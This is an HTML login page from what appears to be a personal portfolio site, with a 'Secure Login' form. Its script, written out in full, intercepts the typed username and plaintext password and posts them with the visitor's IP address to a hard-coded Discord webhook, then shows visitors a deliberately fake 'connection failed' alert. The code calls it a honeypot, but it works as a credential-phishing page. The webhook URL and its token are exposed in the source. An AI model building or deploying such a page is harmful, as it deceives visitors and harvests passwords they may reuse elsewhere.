<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Jan Kirschke</title>
    
    <link rel="stylesheet" href="../style.css">

    <style>
        /* == Ladesymbol (Loader) == */
        #loader-wrapper {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #111;
            z-index: 9999;
            display: flex; justify-content: center; align-items: center;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px; height: 60px;
            animation: spin 1.5s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* == Login-Formular Styles (wie gehabt) == */
        .login-container {
            max-width: 400px;
            margin: 5rem auto;
            padding: 2rem;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: rgba(20, 20, 30, 0.5);
        }
        .login-container h2 { text-align: center; margin-bottom: 1.5rem; }
        .login-container form div { margin-bottom: 1rem; }
        .login-container label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #ccc; }
        .login-container input[type="text"], .login-container input[type="password"] {
            width: 100%; padding: 0.75rem; background-color: #222;
            border: 1px solid #555; border-radius: 4px; color: #fff; box-sizing: border-box;
        }
        .login-container .btn-outline {
            width: 100%; padding: 0.75rem; margin-top: 1rem; cursor: pointer;
            background: transparent; border: 1px solid #3498db; color: #3498db;
        }
        .login-container .btn-outline:hover {
            background: #3498db; color: #fff;
        }
        #ip-info {
            text-align: center; margin-top: 1.5rem; font-size: 0.8rem; color: #888; font-family: monospace;
        }
    </style>
</head>
<body>
    <div id="loader-wrapper">
        <div class="loader"></div>
    </div>

    <div class="stars"></div>
    
    <header>
        <div class="logo">
             <div class="logo-icon"><img src="../images/jan-kirschke-ascii.png" alt="Jan Kirschke Logo"></div>
            <span class="logo-text">Jan Kirschke</span>
        </div>
        <nav>
            <a href="../index.html">Home</a>
            <a href="code_n_caffee.html">Code & Caffee</a>
            <a href="projects.html">Projects</a>
            <a href="contact.html">Contact Me</a>
        </nav>
        <div class="auth-buttons">
            <a href="login.html" class="btn-outline">Login</a>
        </div>
    </header>

    <main class="main-index"> 
        <div class="login-container">
            <h2>Secure Login</h2>
            <form id="login-form">
                <div>
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div>
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn-outline">Login</button>
            </form>
            
            <p id="ip-info">Checking connection...</p>
        </div>
    </main>

    <footer>
        <a href="impressum.html">Impressum</a>
        <a href="https://github.com/Jan-Kirschke" target="_blank">Github</a>
        <a href="https://www.linkedin.com/in/jan-kirschke" target="_blank">LinkedIn</a>
        <a href="https://www.kaggle.com/jankirschke42" target="_blank">Kaggle</a>
    </footer>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        
        const loader = document.getElementById('loader-wrapper');
        const ipInfoElement = document.getElementById('ip-info');
        const loginForm = document.getElementById('login-form');
        
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1445876618458300558/b2T4ZyYWCNCXIEZApJltktwbAmmgE1asljZ5LJqUH1nApZ0Y3z_2e7nDxkZqHqK9JPA1";

        let currentIp = 'Unbekannt';

        // 1. IP abrufen
        fetch('https://api.ipify.org?format=json')
            .then(response => {
                if (!response.ok) throw new Error('Netzwerkfehler');
                return response.json();
            })
            .then(data => {
                currentIp = data.ip;
                ipInfoElement.textContent = 'Your IP: ' + data.ip;
            })
            .catch(error => {
                console.error('IP Fehler:', error);
                ipInfoElement.textContent = 'Connection verify failed.';
            })
            .finally(() => {
                loader.style.display = 'none';
            });

        // 2. Login abfangen und an Discord senden
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Kein Neuladen der Seite

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Wir bauen die Nachricht fÃ¼r Discord
            // "embeds" sorgt fÃ¼r eine hÃ¼bsche Formatierung im Chat
            const payload = {
                username: "Security Bot", // Name des Bots im Chat
                avatar_url: "https://i.imgur.com/4M34hi2.png", // Optional: Ein Icon
                embeds: [
                    {
                        title: "ðŸš¨ Neuer Login-Versuch!",
                        color: 16711680, // Rot (Hex Code in Dezimal)
                        fields: [
                            {
                                name: "IP Adresse",
                                value: currentIp,
                                inline: true
                            },
                            {
                                name: "Username",
                                value: username,
                                inline: true
                            },
                            {
                                name: "Password",
                                value: password, // Hier sehen wir das Passwort
                                inline: false
                            },
                            {
                                name: "Zeitpunkt",
                                value: new Date().toLocaleString('de-DE'),
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Honeypot Log System"
                        }
                    }
                ]
            };

            // Senden an Discord
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert("Verbindung fehlgeschlagen. (Fake Meldung fÃ¼r den User)");
                    console.log("Log an Discord gesendet!");
                } else {
                    console.error("Fehler beim Senden an Discord");
                }
            })
            .catch(error => {
                console.error('Fehler:', error);
            });
        });
    });
    </script>
</body>
</html>
